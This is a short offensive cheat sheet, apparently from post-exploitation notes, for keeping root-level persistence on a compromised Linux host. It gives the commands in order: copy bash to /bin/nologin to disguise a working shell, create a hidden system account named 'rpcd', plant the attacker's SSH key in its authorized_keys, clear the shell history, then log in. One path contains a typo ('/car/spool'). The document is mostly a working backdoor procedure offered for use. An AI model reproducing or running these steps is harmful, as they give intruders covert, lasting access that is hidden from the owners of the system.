# Prerequisite

Root user access

# Attacker

    # ssh-keygen

# Target

    # cp /bin/bash /bin/nologin
    # useradd -r -m -d /var/spool/<USERNAME> -s /usr/sbin/nologin <USERNAME>
    # useradd -r -m -d /var/spool/rpcd -s /bin/nologin rpcd
    # mkdir -p /var/spool/rpcd/.ssh
    # echo '<ATTACKER_PUBLIC_KEY>' >> /var/spool/rpcd/.ssh/authorized_keys
    # chmod 600 /car/spool/rpcd/.ssh/authorized_keys
    # history -c


### Exploitation 

    ssh rpcd@<TARGET_IP>[:SSH_PORT] -i <ATTACKER_PRIVATE_KEY_PATH>


